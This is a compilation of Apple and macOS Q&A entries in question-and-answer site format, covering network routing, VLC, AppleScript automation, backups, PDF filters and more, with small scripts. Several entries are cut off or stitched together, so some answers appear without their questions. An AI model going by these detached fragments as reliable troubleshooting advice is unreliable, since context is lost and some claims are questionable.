you updating apps that were purchased from the App Store? If so, those apps are permanently linked to the Apple ID that purchased/downloaded them, and the only way to remove the association is to delete the app(s) and re-purchase/re-download them under your Apple ID.\n", "Q: Using Wi-Fi and Ethernet at the same time I'm using the macOS High Sierra. There are two network interfaces on my Mac, Wi-Fi and Ethernet. The Wi-Fi is connected to the Internet directly, and the Ethernet is connected to out company's local network. They're in different subnets, one of which is 10.0.0.0/8 and another is 192.168.0.0/16. The Wi-Fi has faster speed than the Ethernet, but the sources in the local network cannot be accessed via Wi-Fi.\nNow I want to route the traffic based on the urls. For example, I want all the access to *.corp.com to the Ethernet and others to Wi-Fi. The problem is the DNS. Those *.corp.com are only valid locally, which means they can only be queried in the local network. If I put Wi-Fi on the top priority, then all the access to *.corp.com would fail due to DNS query failure, because the system will use the DNS servers configured by the Wi-Fi router. However, if I set the Ethernet to the first, all the traffic will go to Ethernet.\nI've tried the way to configure the route table manually, but it didn't work. The same DNS issue.\nSo if there any good ways to handle this situation?\n\nA: Set your DNS server manually to the corporate one, prioritise wi-fi in network settings so it's the default gateway and route 10.x.x.x out through ethernet?\n", "Q: Customize toolbar of VLC On Windows/Linux, it's really easy and straightforward to customize the VLC toolbar by using the menu \"Tools\">\"Customize Interface...\" (See this help page.)\nSomehow this menu doesn't seem to be available in macOS.\nIs it just a missing Mac functionality, or is there a way to customize the buttons showing on the toolbar on macOS?\n\nA: It is indeed missing functionality. You can add (but not change the positions of) some media play buttons like Previous, Next and Show Equalizer to the interface toolbar using Preferences... under the VLC Menu. Clicking the Show All button which appears at the lower-left corner of the Preferences... window will enable a great deal of additional customization, but it's challenging to anticipate or even recall which features are available in Basic, Show All, or both modes. \nI'll alert you to a potential hazard: It's mandatory to save any changes you make to VLC's prefs before moving from one preference area to another, much less between Basic and Show All modes. Otherwise, your changes won't be retained--and there's no warning this is the case. Plus, annoyingly enough, the prefs window closes when you do save your changes, and re-opening it always opens in Basic mode. Furthermore, changing an item in one mode can cause changes to occur to seemingly unrelated items present the other, unseen mode--again, without warning.\nAlso, as far as I know (unless a recent nightly build has re-enabled the option), skins aren't customizable in MacOS and haven't been for years. Oh, here: Let me save you ten minutes of wandering around clicking disclosure triangles looking for the additional media buttons for the toolbar in the Playlist. They're here: Preferences ▸ Show All ▸ Interface ▸ Main Interface ▸ macosx ▸ Appearance\nMind you, if you're determined enough, the Main Interface section is also where you would go to run VLC on a homebuilt Lua or ncurses  interface--and put your buttons wherever you please.\n\nA: Apart from the skins, there is no way to customize the interface in Mac using the Application provided (Other than the options available in preferences).\n", "Q: AppleScript file permission error when trying to save attachment of mail message As per various code snippets on the web I am trying to implement a simple AppleScript to save the attachments of Mail messages to a folder.\nset thePath to ((path to home folder as text) & \"Documents\")\n\ntell application \"Mail\"\n\n    set selectedMessages to selection\n    set theMessage to item 1 of selectedMessages\n\n    set theAttachments to theMessage's mail attachments\n\n    repeat with theAttachment in theAttachments\n        set originalName to name of theAttachment\n        set savePath to (thePath & \":\" & originalName)\n        display dialog (\"Saving attachment to \" & savePath)\n        save theAttachment in savePath\n    end repeat\n\nend tell\n\nHere is what the dialog box reports when I run the script with one message selected in Mail that has an image attached:\n\nSaving attachment to Macintosh\n  HD:Users:billtubbs:Documents:20180415_103233.jpg\n\nHere is the error message I get:\nerror \"Mail got an error: To view or change permissions, select the item in the Finder and choose File > Get Info.\" number -10000\n\nIt is raised on the line \nsave theAttachment in savePath\n\n\nA: A few years late to this party.

The MacBook connected automatically to my home router's Wi-Fi, which is WPA2 password protected. It never prompted me to enter any username, SSID, or password.\nIf the Wi-Fi credentials were stored in the internal SSD, then the credentials should have been erased already. Even if they weren't erased because I messed up the formatting, they were encrypted with FileVault, so the MacBook should not have been able to use them without asking me for the FileVault passphrase first.\nI'm so puzzled.\n\nA: I think you have provided your Apple ID details (including the password) prior to the internet recovery. Thus, this is happening due to iCloud Keychain. (Which stores your passwords in the cloud and use them whenever it needs). If that is not the case and if you sure that the connected wifi network has WPA2, it is suspicious.\n", "Q: Macbook Pro 2011 : After disabling the dGPU using Arch, normal boot hang halfway but working in safe boot I have followed all the instructions provided at \nMacBook Pro: How to disable discrete GPU permanently from EFI? \nand I'm stuck at the following step:\n\n3.1 Move AMD / NVIDIA kext files to a backup directory\nRemove all the AMD (or NVIDIA, depending on your card) kext files in\n  the Terminal in Recovery Console.

From experience, you can set suspicious devices to be auto-banned. This is especially common on public networks. I would imagine that iOS tried to Auto-Join too many times and the network may think it is a DDoS attack. I suggest you talk to the transport company on why you aren't connecting to the internet. Of course, this isn't something that just everyone will be looking to talk to a transport company and I understand it's inconvenient, but I've run a network in the past that's public and that's basically how it works.\nEDIT: The image shows our set duration of invalid attempts.

The things you are expected to transfer are exposed for syncing via iTunes. The audio files are proprietary and are not user accessible or even licensed for this. \n\nA: The quickest way to appropriate those sounds would be to record the headphone / line out on a computer or android or iOS.

You should indeed have seen a iPhone USB item in that list of “Ports”.\nCheck your System Preferences > Network settings. On the left you should see an item for the network interface name something like “iPhone USB”. If not, try using the Location popup menu at top to Edit Locations and add a new location. Alternatively, you might try the + icon button to add an interface of that type to that list.\n\nNow go back to your System Preferences > Sharing > Internet Sharing where you should now see an item named something like iPhone USB. \n\nFrom there, turn on the Internet Sharing checkbox to start sharing. If it does not work, try rebooting your iPhone (hold down Power/Sleep button).\nYou can test to be certain by turning off your iPhone’s Wi-Fi, Bluetooth, and Cellular Data.

I realize there may be other sites that offer such calendars, but I’d prefer to use Apple’s.\n\nA: Okay, Apple had made it so that you have to change your region in Language and Region Preferences in Settings to Vietnam. Also, you need to add the regional language as well to see the holidays of that region, but you don't need to make it the primary language.

I have a laptop, which I use regularly at my desk with monitor etc, as well as on the go. I want to be able to back up my data to an external drive, so I've got a 1 TB drive connected via a USB hub alongside my mouse an keyboard.\nIt's a real pain trying to remember to eject the disk before I unplug the laptop to take it somewhere. Especially when I'm in a hurry I often forget. I've seen that notification countless times when pulling out thumb drives but nothing ever happened so I stopped taking it seriously.\nThat is, until my backup drive got corrupted. It's now in a state where disk utility consistently fails to reformat it and time machine can't write to it. I have two other USB devices this has happened on, but they were fairly old ones I used infrequently so I assumed something else had made them fail.\nWhy does OS X require users to be so careful ejecting drives? Both Windows and Ubuntu (the other two OS's I've used) seem to handle this fine. Is there a way that I can have this drive consistently connected so that backups happen automatically, but that I don't have to worry about the drive being damaged?\n\nA: Actually, the assumption behind your question is incorrect. \nWhile other operating systems may manage the ejection of external drives differently (to some degree), they still require users to eject or safely remove them prior to physically unplugging them while the computer is still powered up.\nThe reason why this is important is that any computer (regardless of OS) can initiate a read or write sequence while it's powered up. It's important to note that not all read/write sequences are initiated by the user. Often they're initiated by the OS or other software, so even though you may think it's safe to remove that drive, it in fact may not be.\nIn terms of how you may be able to have this drive consistently connected so that backups happen automatically without the worry of damaging your drive, there's no 100% safe way without either ejecting the drive or fully shutting down a computer first. However, your next best bet is to ensure you close the lid of your MacBook prior to unplugging the laptop and taking it somewhere. By doing this and waiting a few moments the MacBook will go to sleep and unplugging the external drive will be safer (although not 100% safe).\n\nA: There's no amount of damage you can do to a USB drive by removing it without ejecting it that can't be fixed by a format.\nWindows has a similar removal notification, or at least used to.\nI'm not doubting that there's some issue with your drive, but if it can't be resolved by a low-level format then it wasn't caused by OSX when you failed to eject it prior to removal.\n", "Q: Where is the CE certification on Apple Watch? I've looked everywhere it seems, but I can't find any trace of any CE or FCC certification on the Apple Watch. Now I hear FCC has loosened up lately, but not CE. All electronics have to carry a CE symbol if sold within EU. So where is it?\n\nA: After scrutinising every angle of the Apple Watch I finally spotted the CE marking!\nIt is hidden on the inside of the slot that holds the wristband. See pict below. The etchings are not visible to the eye. The shot was taken with my iPhone X. Even using the x2 lens, I had to pinch zoom quite a lot  to get this picture. \n\nI can only imagine this must have taken an army of certification experts to make it happen. Kudos to Apple for putting much effort into creating a clean product! It really throws some light on the amazing amount of work it takes to make something perfect. \n\nA: Declarations of Conformity\nApple publish their declarations of conformity. These documents include the European standards that have been met:\n\n\n*\n\n*Apple Watch Series 3 - Cellular (A1891)\n\n*Apple Watch Series 3 - Cellular (A1889)\nExemptions to affixing the CE marking\nCE marking does appear to required, but there are exemptions quoted below – thanks to @PeterJ for find the exemptions link:\n\nNevertheless, there are cases when affixing the CE marking on the product is impossible or not possible under reasonable technical or economic conditions. Furthermore, cases when the minimum dimensions cannot be respected, or it cannot be ensured that the CE marking is visibly, legibly and indelibly affixed (European Commission, 2013). In those cases, the CE marking can be affixed to the packaging, it is exists, and/or the accompanying documents. It is not allowed to affix the CE mark to the packing and/or accompanying documents for aesthetic reasons.\n\n", "Q: Does HiDPI (Retina) technology utilize GPU resources? As I understand it should, but I can't find any explicit statement. This is important for me because I'm trying to understand which MacBook should I use - with external GPU or not. Still I can assume that the answer to the question is yes because Apple sells 15-inch with external GPU while 13-inch without it.\nUPDATE:\nIn discussion bellow I found that my original question was wrong (also the wrong term was used - external, I meant discrete). I believed that OS resolution is an absolute setting for all applications. Now I assume that some functions work with native resolution, so it's obvious why they work slower on higher resolution.\nExample of scaling to native resolution: https://developer.mozilla.org/en-US/docs/Web/API/Window/devicePixelRatio\n\nA: Retina is just a marketing word for a high resolution monitor.  The trick is then that instead of just allowing the user to use a lower resolution than the display is physically capable of, macOS lies to the application about its size so it thinks that it is e.g 800x600.  All the system calls that then actually draw stuff like text and graphics then knows about the lie and can utilize the full resolution of the monitor.  \nAll this require GPU support (and was introduced a long way back) to work well so that is not the criteria.\nThe external GPU is useful however if you for any reason need more strength than the internal GPU can provide.  Games and intense visualization rendering are obvious choices.  As they consume more power they usually are only enabled when actually needed falling back on the internal GPU for normal chores.\nUnless you know already that you will run these kind of programs the internal GPU will do fine.\n\nA: You're asking about HiDPI/Retina but that's irrelevant: all macOS screen output goes via the GPU. \nIt makes no difference if that GPU is:\n\n\n*\n\n*integrated (on the logic board)\n\n*discrete (an additional card plugged into the logic board) \n\n*external (additional hardware plugged in via Thunderbolt cable)\n\n\nSo the answer to your question is Yes.\nInstead, you might want to ask: what are your needs from the GPU? \nIf you want to run macOS at 4K@60Hz then you'll need the integrated GPU in a rMBP from 2014 (15\") or 2015 (13\") or newer. \nIf you need 5K, then you're looking at the integrated GPU in a rMBP from 2016 onwards. \nIf there's no rMBP with a GPU that fits your needs, then you can look at a rMBP that will work with an external GPU (eGPU) over Thunderbolt.\nSome 15\" rMBP have two GPUs — one integrated and one discrete — that can be switched between via software automatically or on demand.\nRef: https://support.apple.com/en-gb/HT206587\nmacOS does the scaling from display settings to monitor native resolution using the GPU, rather than the monitor doing the scaling using its hardware. \nI know this because I use a 10+ year old Apple Cinema HD Display that does not have any scaling technology inside yet I can still choose one of a number of resolutions that are different to its native resolution. \nRef: https://discussions.apple.com/thread/1444180?answerId=6900979022#6900979022\n", "Q: Resetting my Mac Apparently I have issues with my partitions so someone on here suggested that I could reset my macOS.  \nIf I do a time machine backup before resetting, does the backup inherit all partition issues or is it merely just saving files and their paths?\nDo I need to look out for something else that might make my life harder?\n\nA: Time Machine saves a copy of your entire macOS partition, so it is not a good choice if your partition is already messed up. If it’s already messed up, you should backup your important files only by copying them to an external drive.\nTime Machine doesn’t copy the partitioning table or other partitions. After you make the backup, boot into Recovery Mode by pressing Command and R at the same time during boot. After that, erase your whole drive using diskutil eraseDisk and restore your backup from Recovery Mode.\n", "Q: Mac os Upgrade 10.13.4 Cannot Find Installer Resources when I try to upgrade my MacBook Pro to 10.13.4,it reported that it cannot find Installer resources.

Doing so will have the effect of condensing your text. Kerning, on the other hand, is actually an adjustment of the space between pairs of letters because in some cases the space between certain combinations of letters creates an unfortunate appearance. \nIn Adobe Photoshop you get access to a lot more functionality and changing things like tracking, kerning, etc are extremely easy. Unfortunately, in Adobe Photoshop Elements there is no obvious way to do this. \nHowever, you do have two options open to you. One is an effective workaround within Photoshop Elements, and the other involves purchasing an add-on.\n1. Workaround\nI do have a workaround for you that will achieve the same effect, and that is to enable Asian Text Options (which I can see from your screenshot is not enabled). Here's what you need to do:\n\n\n*\n\n*Launch Photoshop Elements\n\n*Go to Adobe Photoshop Elements Editor > Preferences > Type...\n\n*In the list of Text Options you'll see a checkbox for Show Asian Text Options - select it and click OK\n\n*Now within your document, select your text again to view your Type tool options\n\n*Now you should see the Asian Text Options below the justification options (see image below)\n\n\n\n\n\n*Now if you click on the drop-down arrow on the right of the Asian Text Options you'll see you can select a range of percentages - doing this will basically change the tracking of the characters/words you selected at Step 4\n\n\nNOTE: Whatever % you select will also apply to any new text you add to your document, so remember to change it back to 0 if you want any new text to start from scratch.\n2. Add-on\nThis requires purchasing the Elements+ add-on. This add-on actually activates a lot of the functions you'd normally find in the full version of Photoshop (many are actually still  in Photoshop Elements - they're just hidden)!\nObviously it'd take up too much space here to describe all of the hidden functions this add-on will enable, but this page shows the Tracking function it enables. \nNote: I am not affiliated in any way with Elements+.\n", "Q: Is there a keyboard shortcut to enable/disable hidden files in Finder?

Is Apple slowing down older iPads too?\nApple said it's slowing down older iPhones which you can disable under battery health, but I think Apple is slowing down iPads too. I watched this  https://youtu.be/Mpq6Ib1IVdA?t=7m49s YouTube video today in which the reviewer said that Apple has slowed down his 2 years old iPad Pro 12.9 inch. \nIf this is true then how can I find out if Apple has slowed my iPad pro too?\n\nA: According to Apples Information the iPads should not be affected.\nApple Support Document:\n\nWith a low battery state of charge, a higher chemical age, or colder\n  temperatures, users are more likely to experience unexpected\n  shutdowns. In extreme cases, shutdowns can occur more frequently,\n  thereby rendering the device unreliable or unusable. iOS 10.2.1\n  (Released January 2017) includes updates for previous models of iPhone\n  to prevent them from unexpectedly shutting down. This includes a\n  feature for iPhone 6, iPhone 6 Plus, iPhone 6s, iPhone 6s Plus, and\n  iPhone SE to dynamically manage the instantaneous performance peaks,\n  only when needed, to prevent the device from unexpectedly shutting\n  down. This capability was also extended to iPhone 7 and iPhone 7 Plus\n  with iOS 11.2, and we will continue improving our power management\n  feature in the future. This feature's only intent is to prevent\n  unexpected shutdowns so that the iPhone can still be used.\n\nSo the feature (or issue as some see it) is not present on the iPad.\nThe iPad under the circumstances that the battery can't deliver the necessary power would shut down and not try to throttle performance.\n", "Q: macOS Calendar app stopped syncing with Google Calendar My Google Calendar account has stopped syncing with the Apple Calendar app on macOS (High Sierra 10.13.4).

Are there more advanced things i can do to force a reset on the syncing of these calendars, like command line settings or Library file deletions?\n\nA: Deleting the Calendar cache and rebooting my Mac seemed to solve it, at least for now. I followed these instructions:\nhttps://wilkinsit.ca/mac-osx/clear-calendar-cache-mac-os/\n\n\n*\n\n*Backup Calendar from the File > Export > Calendar Archive… menu option.\n\n*Close Calendar.app\n\n*Navigate to Library > Calendar folder in Finder\n\n*Remove all files that start with Calendar Cache\n\n*Reboot\n\n*Open Calendar.app and watch as it initializes calendars\n\n", "Q: Airdrop not working; Bluetooth connected.

I'd like to save my history (preferably into a flashcard format) for review.\nAnyone know of someone who's accomplished this or which direction to look in? \n\nA: I have managed to achieve your goal with Automator even though it is a bit slow. Below are the procedures.\n\n*\n\n*Create a new 'Quick Action' with Automator.\n\n\n*Set 'Workflow receives current' to text.\n\n\n*Search 'run javascript' in the search bar, and double click it to create an action. Then paste code below to simulate the lookup keystroke.\nfunction run(input, parameters) {\n    var se = Application(\"System Events\");\n    se.keystroke(\"d\", {using: [\"control down\", \"command down\"]});\n    return input;\n}\n\n\n\n*Search 'run shell script' in the search bar, and double click it to create an action.

I have an iPad pro that will connect to my 5GHz wireless network, gets an IP from the DHCP server (verified on the iPad and on the router itself), and then after 10-20 seconds it disconnects for no apparent reason. It repeats this in a cycle if I have auto-connect turned on. There are no error messages that I can see which would indicate the reason for the disconnect, and examining the logs from the wireless access point it appears that the iPad just decided to disconnect on its own. I have tried forgetting the network on the iPad and reconnecting. I have tried rebooting the device. All to no avail.\nI am hoping I can enable logging on the iPad and determine the reason for the disconnect. This iPad is the sole Apple device I have. I do not have a Mac, so am unable to use XCode.

I noticed tonight that I can't convert a document to black and white in Preview. When I open the PDF in Preview and select Export, I see a select input for Quartz Filters, and I'm able to choose any filter including \"Black & White\". But when I save the document, the filter is not applied.\nSame results if I open the document in ColorSync Utility instead: I see a Filter input, and when I choose \"Black & White\", the window shows me a preview of the document in black and white. But when I click \"Apply\", the document reverts to its previous color mode, and no change is applied.\nIs there any way to troubleshoot or fix this issue? I used this feature a lot in the past.\n\nA: This is a known issue (I reported it directly to Apple engineering) and they are working on a fix in a future update. In the meantime it does mean you need to use 3rd party software or find a workaround.\nWithout knowing what your ultimate aim is, one workaround I have discovered is to first export the PDF as an image file (e.g. a .jpg image) and then open the newly created .jpeg file in Preview and export it again. When you export it, select the PDF option and the Quartz Filter you want. This will then save the file as a PDF again, but this time in grayscale or B&W.\nOf course, this is not ideal in the case of multiple pages. One possible option may be to use Automator, but I haven't pursued this as I already have access to 3rd party software.\nHowever, I can update this answer as soon as it's fixed (the Apple Engineers have committed to letting me know as soon as it's fixed - and I will be following up with them!\n\nUPDATE\nAfter further investigation Apple's Engineers contacted me on 9 August 2018 to advise they have determined that this issue only occurs when PDFs have been originally produced by certain 3rd party products, typically older ones. As a result, a fix for this may no longer be in the pipeline because as time goes by users are less likely to come across PDFs originally produced by these older legacy products.\nIn my own testing I have found the problems do not occur with PDFs originally created with MS Office 2016 or later (both Mac and Windows versions). However, the problem does occur with PDFs originally created with older versions of MS Office (e.g. 2010, 2013) and other software such as PDFCreator.\nThe age of the original software is not necessarily indicative of whether a PDF will have issues. For example, PDFs produced with Adobe InDesign CS5 (2010 vintage) and QuarkXPress 9 (2011 vintage) work fine with Quartz Filters.\nAt present this has been left open by the Engineers until macOS Mojave is released. However, if it is not rectified by then it will be closed as it's unlikely to ever be.\nWorkaround for multi-page PDFs\nIn my own testing I have found a workaround that works perfectly for multipage PDFs, albeit somewhat ironically. However, it is an easy workaround:\n\n\n*\n\n*Open the problematic PDF in Preview\n\n*Go to File > Export as PDF...\n\n*Give it a name, choose a location and click on the Save button\n\n*Open the newly created PDF in Preview\n\n*Go to File > Export...\n\n*Select PDF as your format\n\n*Choose the Quartz Filter you want (e.g. Black & White or Grey Tone)\n\n*Give it a name, choose a location and click on the Save button\n\n*Now your newly exported multi-page PDF will have the Quartz Filter applied\n\n\nA: Hmmm... Interesting - \\\nI have a simple workflow consisting of just one action - Apply Quartz filter to a .pdf file.\nThe PDF is created from OpenOffice Calc using the \"Export\" option. When I pass this PDF to the workflow, the filter is NOT applied. When I pass it again (without making any changes) it works !!! \nIf the PDF is created form OpenOffice Calc using the \"Print to PDF option, it works straight away.\n", "Q: What is the best way to report a bug/feature request discussed here to Apple?

Apple doesn't have official support for it on an internal screen and developers have to code it into their apps and will cause notable performance drops compared to using an internal display.

I'd want to set a global shortcut key for the \"Go to Folder...\" action available from Finder's dock icon.\nRight now I figured out how to trigger the same action from Finder's menu bar via AppleScript:\ntell application \"Finder\" to activate\n\ntell application \"System Events\"\n    keystroke \"g\" using {shift down, command down}\nend tell\n\nhowever I don't like this solution because if there's a space with Finder windows open, and I'm in another space without Finder windows open, that causes to switch spaces.\nInstead, right clicking Finder's dock icon and selecting \"Go to Folder...\" keeps me in the space I'm in.\nHow to automate this action and set it as a global keyboard shortcut?\n\nA: First a word about global keyboard shortcuts... It should stand to reason that any user assigned global keyboard shortcut has to be unique to both the OS and any application that has focus when the keys are pressed, otherwise it will not function as desired. While one would like to have to press as few keys as possible, nonetheless using a four key sequence is probably going to be the best bet to avoid stepping on a default keyboard shortcut that is already assigned to the OS and or any app that has focus when the keys are pressed. Also making the fourth key something other then the typical alpha keys may be more beneficial in avoiding something already assigned.\nKeep in mind though that the default, developer assigned, keyboard shortcuts of most any given application can be modified in order to free up a particular combination that one may want to use. Personally I try to avoid doing this, however to make changes, the target menu command can be added to: System Preferences > Keyboard > Shortcuts > App Shortcuts\nAs an example, Go to Folder…  of the Go menu in Finder can be added and its default ⇧⌘G can be modified to e.g. ⌃⇧⌘G so the default keyboard shortcut can be used in this case to trigger the example AppleScript code used in this answer with e.g. FastScripts.\nApple has made it increasingly more difficult to use an Automator Service in particular cases and as such, this particular use case, I personally use and recommend FastScripts. Note that I have no affiliation with the developer of FastScripts and am just a satisfied user of the product.\nThe following example AppleScript code used in conjunction with FastScripts will do as you asked under the expressed conditions in your OP and you will only need to add FastScripts to System Preferences > Security & Privacy > Privacy > Accessibility in order to have this script function. In other words, if FastScripts is the only app in Accessibility for Security & Privacy this script will function as intended.\nThat said, if you want to test the example AppleScript code before saving it, you do need to add Script Editor, but it's not required for the actual functioning under FastScripts. I mention this because when going the Automator Service route it can require adding two or more apps to get this same script just to run, however it will still not function as desired as an Automator Service and why FastScripts is being recommended.\nExample AppleScript code:\ntell application \"System Events\"\n    tell UI element \"Finder\" of list 1 of application process \"Dock\"\n        perform action \"AXShowMenu\" \n        click menu item \"Go to Folder…\" of menu 1\n    end\nend tell\n\nUsing Script Editor, I saved the code above as Go to Folder.scpt in ~/Library/Scripts and in FastScripts assigned it the keyboard shortcut ⌃⇧⌘G until such time I find it conflicts with any other app I use.\nNoted that this was tested and works as stated on my system running macOS High Sierra 10.13.4 regardless of what app had focus when the keys were pressed.\nI also did not need to use a delay command between perform action ... and click menu item ... however note that the value of any delay command will need to be adjusted for your system, and or additional delay commands may or may not be needed. Adjust the value(s) of and or add/remove the delay command(s) as appropriate.\n\nNote: The example AppleScript code is just that and does not employ any error handling and is meant only to show one of many ways to accomplish a task. The onus is always upon the User to add/use appropriate error handling as needed/wanted.  \n", "Q: How to connect 2 external non Apple monitors with 13\" MacBook Pro 2017 This MacBook Pro has only two USB-C ports.

In AppleScript you can create a finder window with:\ntell application \"Finder\"\n    activate\n    set newWindow to make new Finder window\nend tell\n\nafter setting the target if you want to create a new tab I'm aware of:\ntell application \"System Events\"\n    keystroke \"t\" using command down\nend tell\n\nper searching through older questions and from Google.  In AppleScript is there another way to create tabs without having to use:\nkeystroke \"t\" using command down\n\nand if a window is created with four tabs is there a way to change what tab the window is active in?  For example:\ntab 1\ntab 2\ntab 3\ntab 4\n\nLooping through the tabs with a repeat and keystroke final tab would be tab 4 but I'm not sure how to tell the finder window that the frontmost tab should be tab 2 and I dont want to change the sequence the tabs are created meaning, I dont want:  \ntab 1\ntab 3\ntab 4\ntab 2\n\nor is there an efficient way to parse what tabs are open in that particular tab? Can this be done?\n\nA: I can say until 10.9 this isn't possible because the property of tab isn't implemented into applescript. After 10.9... I don't know but you can check it by yourself like this:\nOpen 1 Finder Window with two or more tabs, then:\ntell application \"Finder\"\nproperties of Finder window 1\nend tell\n\n...now if you can find something in the result that speaks about tab, then you can use this property to work on tabs. Alternatively just open the Applescript Finder Library and search for tab.

In particular this only works if the machine is used by a single user only. Are there any other ways to do the job?\n\nA: Nice hack!\nIf you want to cover the edge case where there are multiple people logged in to the Mac and running Terminal then I suggest you change the if test to if [ $(ps | wc -l) -eq 3 ]; which would mean your user had only one process running, the bash shell you want to exit and quit Terminal.\nPersonally, I use iTerm2 which has a preference (under \"General\") for \"Quit when all windows are closed\" so the app takes care of it. If you have got this far with bash I highly recommend iTerm2.\nBy the way, your method breaks in iTerm2 as it only shows one log in with who no matter the number of windows you have open. My solution can sometimes fail to recognise only one window if you close them quickly in iTerm2 as it takes a couple of seconds for the app to shut down the window server instance.\nIf you have both Terminal and iTerm running then it breaks everything I could think of as well but you'd only be doing that if you were a constant iTerm2 user answering a question at AskDifferent about Terminal. :)\n", "Q: Is it possible to get an app for internal employees in the AppStore? We're developing an app for internal employees for easy communication. Now we want to remove all potential barriers for our employees (1500+) to install the app.\nTherefore we would like to host the app within the AppStore - employees can then download it like they are normally used to download other apps.\nOf course there will be a login screen in advance to make sure that only employees see the right information.\nThe app got rejected with the following:\n\nGuideline 3.2 - Business\nWe found that your app is an in-house app, intended for employees or\nmembers of your organization.

There are some open source MDMs available but at the moment they all seem more focussed on Mac management than iOS.\n\nA: \nTherefore we would like to host the app within the AppStore - employees can then download it like they are normally used to download other apps.\nOf course there will be a login screen in advance to make sure that only employees see the right information\n\nSimple answer No. Not without the app being also accessible publicly.\nThere is no way to host private/enterprise apps on the App Store, without being publicly discoverable. App Store doesn't support this mechanism of authentication for enterprise apps. If your app is on the App Store, it is publicly available in the region where it is published.\nThe appropriate solution in this case is to host the app on a web server. You will be able to pass the URL where the app is hosted to your employees. The app can be simply installed by opening the website in Safari. Having control over the programming of the website, it will be relatively straightforward to implement user authentication. (That way the website can even be accessible over public Internet)\nA good answer explaining steps to take can be found here. This approach doesn't involve MDM, and the users won't be seeing the alert that you are concerned about. The users will simply need to install a specially created provisioning profile, which will also be hosted on the app web-page.\nThis approach doesn't involve any costs and can be deployed for free (considering that your company manages it's own internal server infrastructure).\n\nHow are huge companies with 15.000+ users handling this when there is a Bring your Own Device policy?\n\nIn my experience the aforementioned approach is quite common in companies with BYOD policy.\nNote: Credits to the original author of the answer.\n", "Q: Pages update gone wrong When I spotlight search for Pages on my mac, it opens \"pages panel\" but not pages.

I used the id3v2 utility on linux and set the track frame as \"N/M\" where N=Track number and M=Total number of tracks.  Then import the mp3 files to iTunes and now you should see the files grouped as an album with the tracks already in the right order.  Select the album, command-click or right-click and choose File Info -> Options, change the Media Kind to Audiobook, and you now should have your audiobook in order! \nThe id3v2 utility is a sourceforge project.  Its page is here:\nhttp://id3v2.sourceforge.net/\nI wrote a shell script to set the N/M track.  You need to put each audiobook in its own directory, and run this script in each directory, for this script to work.\n$ cat set_audiobook_track_numbering.sh\n#\n# Sets track numbering in all MP3s in current directory\n#\n\nCOUNTER=0\nTRACKCNT=`/bin/ls *.mp3 | wc | awk '{print $1}'`\nfor F in *mp3 ; do\n   let COUNTER++\n   echo id3v2 -T \"$COUNTER/$TRACKCNT\" \"$F\"\n   id3v2 -T \"$COUNTER/$TRACKCNT\" \"$F\"\ndone\n\necho Done.  Set track number in $TRACKCNT mp3s.\n\n", "Q: Call rings on bluetooth headphones, but when i pickup it defaults to the call being on the iPhone I have my iPhone connected to a pair of bluetooth headphones for listening to music. \nIf someone calls while im listening to music the call will ring on the headphones, but as soon as i pickup the call, by using \"slide to answer\" on the iPhone; the call starts on my phone eg. through the phone's earpiece, i then have to manually select the call to be taken through the headphones. \nIs there anyway i can set the iPhone to continue the call through the headphones by default ? \nIm running ios 11.3 on an iPhone 7.\nThe bluetooth headphones im using are Bose quiet comfort 35.\n\nA: The phone calls audio will be routed to the device you accept your phone call with.

In Pages (version 7), I can create a Bookmark and I can insert a link to a Bookmark. When linking to a Bookmark, the page number the Bookmark is on is visible. (That is, Pages is aware of what page number the Bookmark is on.)\n\nSeparately, I can also insert the current page number and it will automatically update when I add content at the beginning of the document and cause that page number to go to a different page.\nIs there a way that I can insert a reference to a Bookmark's page number such that it will automatically update when I add content at the beginning of the document and cause the Bookmark to go to a different page? In the screenshot above, I'd like it to say (page 4) instead of (page #), and for 4 to auto-update as the Bookmark moves around the document.\n\nA: Interesting question! I checked the Add bookmarks and cross-references in Pages page and couldn't find anything that would achieve what you want.\nI then turned my attention to MS Word, thinking that if I could find a way to do it in MS Word, perhaps then I could adapt it to work with Pages.\nThe good news is I've found a way to do what you want in MS Word, but the bad news is I haven't been able to replicate this in Pages. So as it currently stands I don't think this is currently possible in Pages.\nI would recommend you provide feedback via Apple's Pages feedback page (Note: You can also access this from: Pages > Provide Pages Feedback.\nCross-referencing bookmarks in MS Word\nIn the interests of perhaps helping someone else come up with a solution for pages, (and in helping users of MS Word), here's how I achieved this in MS Word:\n\n\n*\n\n*Create your bookmarks as usual\n\n*Add your links to your bookmarks throughout your document\n\n*Now, let's say you have a bookmark called Diagram7 that's on page 10 and you're linking to that from the words \"see Diagram 7\" in a paragraph on page 3. To create your cross reference you would do the following:\n\n\n*\n\n*place your cursor after the words you're linking from\n\n*now go to Insert > Cross-reference... to bring up the Cross-reference window\n\n*select Bookmark for your Reference type\n\n*select Page Number for your Insert reference to\n\n*select the Diagram7 bookmark in your list of bookmarks\n\n*click on the Insert button\n\n\n*Now the page number will be displayed at the location your cursor was at\nNOTE: Just like other fields within MS Word, when the value changes (e.g. the diagram moves to page 12, so the value needs to change from 10 to 12), you will still need to use the Update Field option as normal to update the values displayed.\n", "Q: Symbolic integration in Grapher.app? Several months ago I was using Grapher, something strange happened. Instead of going to Equation → Integrate, I clicked the symbols menu (with the summation notation, cube root, etc.) and clicked the integral there instead. Now, whenever I do Equation → Integrate it does the silly integral computation instead of the symbolic integration which is so much better. The silly integral computation struggles to compute an integral of 2x to the left of the y-axis, although it may have its uses with integrals which cannot be solved symbolically. It used to say about symbolic integration here but now that page isn't working so now it's turned into a bit of a conspiracy theory.\nDoes anyone have access to the original symbolic integration? Has anyone else experienced this bug?\nI have been meaning to ask this somewhere for a while, also, I have no evidence that the symbolic integration even existed so anything about that helps.\n\nA: There are some options about integration in Grapher Preferences. \nYou can also try deleting its preferences file ~/Library/Containers/com.apple.grapher/Data/Library/Preferences/com.apple.grapher.plist\n", "Q: Why doesn't my iPhone 6 scan certain QR codes? My iPhone 6 works fine for common QR codes, but won't scan certain 2D codes (mac parts QR codes, for example).  Are these codes different?\n\nA: Not all 2D codes that look like QR codes are QR codes.\nQR codes have a distinctive square position pattern in one or more of the corners of the code, like this one for Wikipedia.\n\nBased on this iPhone X teardown, it looks like Apple uses Data Matrix for 2D codes on their parts.\n\nThe iPhone camera can only scan QR codes, and not other 2D or 1D codes like UPC, Code 39, PDF417, Data Matrix, MaxiCode, etc. There are apps on the App Store that can read these codes.\n", "Q: Auto-connect to iPhone hotspot My iPhone Wi-Fi hotspot (first one in the screenshot) is shown with a different icon from any other hotspots (Android, broadband etc).\n \nThis doesn't bother me except I need to manually re-connect my Mac to the hotspot whenever it's restarted/woke up from sleep, instead of it auto-connecting like other Wi-Fi 